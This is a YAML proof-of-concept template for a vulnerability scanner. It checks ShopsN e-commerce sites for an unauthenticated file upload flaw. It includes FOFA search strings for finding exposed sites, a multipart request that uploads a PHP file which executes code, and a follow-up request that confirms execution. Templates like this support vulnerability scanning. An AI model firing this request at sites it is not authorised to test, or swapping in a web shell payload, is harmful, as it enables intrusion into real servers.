id: poc-yaml-shopsn-commentupload-file-upload
info:
  name: ShopsN commentUpload 文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: ShopsN
  fofa: title="上海盈赛电子商务有限公司" || body="/Supermarket/ProductList" || body="/Uploads/conf/supermarket"
    || body="/Uploads/intnet/"
variables:
  t1: random_str(6)
  t2: md5(t1)
  filename: random_str(8)
  bountary: random_str(34)
requests:
- method: POST
  path: /index.php/Home/AppUpload/commentUpload
  headers:
    Content-Type: multipart/form-data; boundary=----{{.bountary}}
  data: '------{{.bountary}}

    Content-Disposition: form-data; name="img"; filename="{{.filename}}.php"

    Content-Type: text/php


    <?php $a=md5({{.t1}});echo $a;?>

    ------{{.bountary}}

    Content-Disposition: form-data; name="submit"


    Submit

    ------{{.bountary}}--

    '
  expression: 'status_code == 200 &&

    contains(headers,"text/html")

    '
- method: GET
  path: /Uploads/show/{{.filename}}.php
  expression: 'status_code == 200 &&

    contains(headers,"text/html") &&

    contains(body,t2)

    '
transport: http
